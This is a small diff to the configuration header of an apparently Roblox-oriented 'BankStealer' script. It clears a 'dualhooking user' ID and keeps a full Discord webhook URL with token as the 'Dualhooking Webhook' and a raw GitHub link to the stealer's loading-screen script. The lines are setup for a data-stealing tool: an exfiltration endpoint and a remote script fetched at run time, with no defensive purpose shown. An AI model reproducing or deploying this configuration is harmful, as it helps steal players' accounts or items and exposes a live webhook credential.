@@ -1,4 +1,4 @@
-local dhuser = "3023147869"       -- dualhooking user
+local dhuser = ""       -- dualhooking user
 local dhwebhook = "https://discord.com/api/webhooks/1129572525244944478/RrbfbuPLKcqQCx6HevhrtXCxft5ScBOxn93i4Lphf19a3ojSABY-gPX1L2tLo13Ut59d" -- Dualhooking Webhook
 local loadingraw = "https://raw.githubusercontent.com/HerrSimoNHub/BankStealer/main/Loading.lua" -- Put Your LoadingScreen Raw Link Here
 
